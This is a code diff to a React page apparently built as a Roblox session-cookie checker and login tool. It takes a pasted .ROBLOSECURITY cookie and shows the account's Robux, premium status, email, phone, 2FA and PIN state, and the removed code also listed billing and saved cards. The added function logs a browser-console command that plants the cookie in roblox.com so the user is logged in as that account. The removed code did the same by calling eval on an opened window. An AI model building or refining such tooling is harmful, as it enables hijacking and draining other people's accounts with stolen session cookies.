@@ -3,6 +3,7 @@
 import { useState } from "react"
 import { motion } from "framer-motion"
 import { Button } from "@/components/ui"
+import toast from "react-hot-toast"
 
 export default function RobloxLoginPage() {
   const [cookie, setCookie] = useState("")
@@ -51,9 +52,22 @@ export default function RobloxLoginPage() {
     } finally { setLoading(false) }
   }
 
+  function openRobloxSession() {
+    const ck = cookie.trim()
+    navigator.clipboard.writeText(ck).catch(() => {})
+    toast.success("Cookie copied to clipboard!", { duration: 4000 })
+    const w = window.open("https://www.roblox.com/home", "_blank")
+    if (w) {
+      setTimeout(() => {
+        toast("Press F12 → Console → paste cookie script (check logs below)", { duration: 8000, icon: "💡" })
+      }, 1500)
+    }
+    addLog("Cookie copied to clipboard")
+    addLog("Paste in browser console: document.cookie = '.ROBLOSECURITY=YOUR_COOKIE;domain=.roblox.com;path=/'; location.reload()")
+  }
+
   return (
     <div className="min-h-[calc(100vh-4rem)] relative overflow-hidden bg-background">
-      {/* Animated gradient background */}
       <div className="absolute inset-0 opacity-30">
         <div className="absolute -top-40 -left-40 w-96 h-96 rounded-full bg-red-500/20 blur-[120px] animate-pulse" />
         <div className="absolute top-1/2 -right-40 w-80 h-80 rounded-full bg-orange-500/15 blur-[100px] animate-pulse" style={{ animationDelay: "1s" }} />
@@ -61,71 +75,65 @@ export default function RobloxLoginPage() {
       </div>
 
       <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="relative z-10 flex flex-col lg:flex-row gap-0 min-h-[calc(100vh-4rem)]">
-        {/* Left Panel - User Info Card */}
-        <div className="lg:w-[380px] bg-card/40 backdrop-blur-xl border-r border-border/50 flex flex-col p-8">
-          <div className="flex flex-col items-center">
-            <div className="relative mb-6">
-              <div className="absolute inset-0 rounded-full bg-red-500/30 blur-2xl scale-150 animate-pulse" />
-              <div className="w-44 h-44 rounded-full border-[3px] border-red-500/60 bg-card/80 flex items-center justify-center overflow-hidden relative z-10 shadow-[0_0_40px_rgba(239,68,68,0.2)]">
-                {userData?.avatarUrl ? (
-                  <img src={userData.avatarUrl} alt="Avatar" className="w-full h-full object-cover" />
-                ) : (
-                  <div className="flex flex-col items-center gap-1">
-                    <svg className="w-16 h-16 text-red-500/40" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
-                    <span className="text-[10px] text-muted-foreground">No cookie</span>
+        {/* Left Panel - Clean Info Card */}
+        <div className="lg:w-[320px] bg-card/40 backdrop-blur-xl border-r border-border/50 flex flex-col items-center p-6 pt-10">
+          <div className="relative mb-4">
+            <div className="absolute inset-0 rounded-full bg-red-500/30 blur-2xl scale-150 animate-pulse" />
+            <div className="w-36 h-36 rounded-full border-[3px] border-red-500/60 bg-card/80 flex items-center justify-center overflow-hidden relative z-10 shadow-[0_0_40px_rgba(239,68,68,0.2)]">
+              {userData?.avatarUrl ? (
+                <img src={userData.avatarUrl} alt="Avatar" className="w-full h-full object-cover" />
+              ) : (
+                <svg className="w-14 h-14 text-red-500/40" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
+              )}
+            </div>
+          </div>
+
+          <h2 className="text-xl font-bold font-mono bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent text-center">
+            {userData?.username || "Guest"}
+          </h2>
+          <p className={`text-xs font-mono mt-1.5 ${userData ? "text-green-400" : "text-muted-foreground"}`}>
+            {userData ? "Cookie Validated ✅" : "Paste cookie →"}
+          </p>
+
+          {userData && (
+            <div className="mt-6 w-full space-y-2">
+              {/* Robux Card */}
+              <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/20 rounded-xl p-3.5 text-center">
+                <p className="text-[10px] text-green-400/70 uppercase tracking-wider font-mono">Robux</p>
+                <p className="text-2xl font-black text-green-400 font-mono">R$ {userData.robux?.toLocaleString()}</p>
+              </div>
+
+              {/* Premium Badge */}
+              <div className={`rounded-xl p-3 text-center border ${userData.premium ? "bg-yellow-500/10 border-yellow-500/30" : "bg-zinc-800/50 border-zinc-700/30"}`}>
+                <p className={`text-sm font-bold font-mono ${userData.premium ? "text-yellow-400" : "text-zinc-400"}`}>
+                  {userData.premium ? "⭐ PREMIUM" : "Free Account"}
+                </p>
+              </div>
+
+              {/* Security Info */}
+              <div className="bg-card/60 border border-border/50 rounded-xl p-3.5 space-y-2.5">
+                <p className="text-[10px] text-muted-foreground uppercase tracking-wider font-mono text-center mb-1">Security</p>
+                {[
+                  { label: "Email", value: userData.email || "—", ok: userData.emailVerified },
+                  { label: "Phone", value: userData.phone || "—", ok: userData.phoneVerified },
+                  { label: "2FA", value: userData.twoFa ? "ON" : "OFF", ok: userData.twoFa },
+                  { label: "PIN", value: userData.pin ? "ON" : "OFF", ok: userData.pin },
+                ].map(({ label, value, ok }) => (
+                  <div key={label} className="flex items-center justify-between text-xs">
+                    <span className="text-zinc-500 font-mono">{label}</span>
+                    <span className={`font-mono ${ok ? "text-green-400" : "text-zinc-400"}`}>
+                      {value} {label === "2FA" || label === "PIN" ? "" : ok ? "✓" : ""}
+                    </span>
                   </div>
-                )}
+                ))}
               </div>
             </div>
-            <h2 className="text-2xl font-bold font-mono bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent">
-              {userData?.username || "ROBLOX Guest"}
-            </h2>
-            <p className={`text-sm font-mono mt-2 ${userData ? "text-green-400" : "text-muted-foreground"}`}>
-              {userData ? "Cookie Validated ✅" : "Enter .ROBLOSECURITY cookie..."}
-            </p>
-          </div>
-
-          {/* Info Tiles */}
-          <div className="mt-8 space-y-2.5 flex-1 overflow-y-auto">
-            {[
-              { label: "DISPLAY NAME", value: userData?.displayName || "—", icon: "📛" },
-              { label: "USER ID", value: userData?.uid || "—", icon: "🆔" },
-              { label: "ROBUX", value: userData ? `R$ ${userData.robux?.toLocaleString() || 0}` : "—", icon: "💰" },
-              { label: "PENDING", value: userData ? `R$ ${userData.pendingRobux?.toLocaleString() || 0}` : "—", icon: "⏳" },
-              { label: "RAP", value: userData ? `R$ ${userData.rap?.toLocaleString() || 0}` : "—", icon: "📊" },
-              { label: "BILLING", value: userData?.billing || "—", icon: "💳" },
-              { label: "CARDS", value: userData?.cards?.toString() || "—", icon: "💳" },
-              { label: "PREMIUM", value: userData ? (userData.premium ? "✅ Yes" : "❌ No") : "—", icon: "⭐" },
-              { label: "EMAIL", value: userData?.email ? `${userData.email} ${userData.emailVerified ? "✅" : ""}` : "—", icon: "📧" },
-              { label: "PHONE", value: userData?.phone ? `${userData.phone} ${userData.phoneVerified ? "✅" : ""}` : "—", icon: "📱" },
-              { label: "2FA", value: userData ? (userData.twoFa ? "🔒 Enabled" : "🔓 Disabled") : "—", icon: "🔐" },
-              { label: "PIN", value: userData ? (userData.pin ? "🔒 Enabled" : "🔓 Disabled") : "—", icon: "🔢" },
-              { label: "COUNTRY", value: userData?.country || "—", icon: "🌍" },
-              { label: "CREATED", value: userData?.created || "—", icon: "📅" },
-              { label: "AGE", value: userData?.ageDays ? `${userData.ageDays} days` : "—", icon: "🎂" },
-              { label: "VERIFIED", value: userData ? (userData.verified ? "✅ Yes" : "❌ No") : "—", icon: "✔️" },
-              { label: "FRIENDS", value: userData?.friends?.toLocaleString() || "—", icon: "👥" },
-              { label: "FOLLOWERS", value: userData?.followers?.toLocaleString() || "—", icon: "👁️" },
-              { label: "FOLLOWINGS", value: userData?.followings?.toLocaleString() || "—", icon: "🔍" },
-              { label: "GROUPS", value: userData ? `${userData.groups || 0} (${userData.groupsOwned || 0} owned)` : "—", icon: "🏘️" },
-              { label: "BADGES", value: userData?.badges?.toString() || "—", icon: "🏅" },
-              { label: "WEARING", value: userData ? `${userData.wearing || 0} items` : "—", icon: "👕" },
-              { label: "GAMES", value: userData ? `${userData.games || 0} public` : "—", icon: "🎮" },
-            ].map(({ label, value, icon }) => (
-              <div key={label} className="bg-card/60 backdrop-blur-sm border border-border/50 rounded-xl p-3.5 flex items-center gap-3 hover:border-red-500/30 transition-colors">
-                <span className="text-lg shrink-0">{icon}</span>
-                <div className="min-w-0">
-                  <p className="text-[10px] font-mono text-muted-foreground uppercase tracking-wider">{label}</p>
-                  <p className="text-sm font-mono text-foreground truncate">{value}</p>
-                </div>
-              </div>
-            ))}
-          </div>
+          )}
         </div>
 
-        {/* Right Panel - Login Form */}
-        <div className="flex-1 flex flex-col justify-center px-8 lg:px-20 py-12">
-          <div className="mb-12">
+        {/* Right Panel - Form */}
+        <div className="flex-1 flex flex-col justify-start pt-16 lg:pt-24 px-8 lg:px-20">
+          <div className="mb-8">
             <h1 className="text-5xl lg:text-6xl font-black font-mono tracking-tighter">
               <span className="bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                 ROBLOX COOKIE
@@ -140,7 +148,7 @@ export default function RobloxLoginPage() {
           <label className="text-xs font-mono font-bold text-foreground/80 mb-2.5 uppercase tracking-wider block">
             .ROBLOSECURITY Cookie
           </label>
-          <div className="flex gap-3">
+          <div className="flex gap-3 max-w-2xl">
             <div className="flex-1 relative group">
               <div className="absolute -inset-0.5 bg-gradient-to-r from-red-500 to-orange-500 rounded-2xl opacity-0 group-focus-within:opacity-40 blur transition-opacity" />
               <input
@@ -159,15 +167,12 @@ export default function RobloxLoginPage() {
               {showCookie ? "🙈" : "👁️"}
             </button>
           </div>
-
-          {/* Cookie format hint */}
-          <p className="text-[10px] text-muted-foreground font-mono mt-2">
+          <p className="text-[10px] text-muted-foreground font-mono mt-2 max-w-2xl">
             Format: _|WARNING:-DO-NOT-SHARE-THIS...
           </p>
 
-          {/* Progress Bar */}
           {loading && (
-            <div className="mt-5 h-2 bg-card/50 rounded-full overflow-hidden border border-border/30">
+            <div className="mt-5 h-2 bg-card/50 rounded-full overflow-hidden border border-border/30 max-w-2xl">
               <motion.div
                 className="h-full bg-gradient-to-r from-red-500 via-orange-400 to-yellow-400 rounded-full"
                 animate={{ x: ["-100%", "100%"] }}
@@ -178,48 +183,39 @@ export default function RobloxLoginPage() {
           )}
 
           {error && (
-            <motion.p initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="text-red-400 text-sm font-mono mt-3 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-2">
+            <motion.p initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="text-red-400 text-sm font-mono mt-3 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-2 max-w-2xl">
               {error}
             </motion.p>
           )}
 
-          {/* Verify Button */}
-          <Button
-            onClick={handleVerify}
-            loading={loading}
-            disabled={!cookie.trim()}
-            className="mt-6 h-16 text-lg font-mono font-bold w-full bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-400 hover:to-orange-500 border-0 shadow-lg shadow-red-500/20 transition-all"
-          >
-            VERIFY &amp; LOGIN
-          </Button>
-
-          {/* Browser Auto-Login */}
-          {userData && (
-            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-6">
+          {/* Buttons */}
+          <div className="flex gap-3 mt-6 max-w-2xl">
+            <Button
+              onClick={handleVerify}
+              loading={loading}
+              disabled={!cookie.trim()}
+              className="flex-1 h-14 text-base font-mono font-bold bg-gradient-to-r from-red-500 to-orange-600 hover:from-red-400 hover:to-orange-500 border-0 shadow-lg shadow-red-500/20 transition-all"
+            >
+              VERIFY
+            </Button>
+            {userData && (
               <Button
-                onClick={() => {
-                  const w = window.open("https://www.roblox.com/Login", "_blank")
-                  if (w) {
-                    const ck = cookie.trim()
-                    const script = `
-                      document.cookie = ".ROBLOSECURITY=" + "${ck}" + "; domain=.roblox.com; path=/";
-                      setTimeout(() => location.href = "https://www.roblox.com/home", 1500);
-                    `
-                    setTimeout(() => { try { (w as any).eval(script) } catch {} }, 2000)
-                  }
-                }}
-                className="w-full h-12 bg-red-600/80 hover:bg-red-500/80 backdrop-blur-sm border border-red-400/30 font-mono text-sm"
+                onClick={openRobloxSession}
+                className="flex-1 h-14 text-base font-mono font-bold bg-green-600/80 hover:bg-green-500/80 backdrop-blur-sm border border-green-400/30"
               >
-                🎮 Open Roblox in Browser (Auto-Login)
+                🎮 Open Roblox
               </Button>
-              <p className="text-[10px] text-muted-foreground font-mono text-center mt-2">
-                Opens Roblox and injects your cookie for auto-login
-              </p>
-            </motion.div>
+            )}
+          </div>
+
+          {userData && (
+            <p className="text-[10px] text-muted-foreground font-mono mt-2 max-w-2xl">
+              Cookie copied to clipboard. Open Roblox → F12 Console → paste the cookie command.
+            </p>
           )}
 
           {/* Console Log */}
-          <div className="mt-8 bg-black/40 backdrop-blur-md border border-border/30 rounded-2xl p-4 h-36 font-mono text-xs overflow-y-auto">
+          <div className="mt-6 bg-black/40 backdrop-blur-md border border-border/30 rounded-2xl p-4 h-32 font-mono text-xs overflow-y-auto max-w-2xl">
             {consoleLines.map((line, i) => (
               <p key={i} className={`${line.includes("ERROR") ? "text-red-400" : line.includes("SUCCESS") ? "text-green-400" : "text-orange-400/80"}`}>
                 {line}
